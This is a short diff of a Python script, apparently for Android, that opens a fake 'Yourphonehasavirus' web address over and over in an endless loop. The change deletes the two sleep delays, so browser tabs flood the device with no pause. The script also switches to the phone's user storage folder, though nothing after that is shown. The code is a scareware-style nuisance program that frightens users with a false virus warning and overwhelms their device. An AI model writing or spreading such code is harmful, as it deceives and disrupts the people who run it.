@@ -3,9 +3,7 @@ import webbrowser
 import time
 
 while True:
-	time.sleep(2)
 	webbrowser.open("https://Yourphonehasavirus/ByThund3r")
-	time.sleep(2)
 
 os.chdir("/storage/emulated/0/")
 
